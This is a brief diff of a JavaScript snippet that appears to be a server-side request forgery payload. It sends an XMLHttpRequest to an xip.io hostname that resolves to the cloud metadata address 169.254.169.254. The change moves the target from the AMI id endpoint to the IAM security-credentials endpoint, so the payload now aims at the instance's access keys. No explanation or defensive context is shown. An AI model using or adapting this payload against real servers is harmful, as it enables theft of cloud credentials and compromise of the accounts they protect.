@@ -9,5 +9,5 @@ function reqListener () {
 } 
 var oReq = new XMLHttpRequest(); 
 oReq.addEventListener("load", reqListener); 
-oReq.open("GET", "https://169.254.169.254.xip.io/latest/meta-data/ami-id"); 
+oReq.open("GET", "https://169.254.169.254.xip.io/latest/meta-data/iam/security-credentials/ami-07cae14b3eea4cd53"); 
 oReq.send();
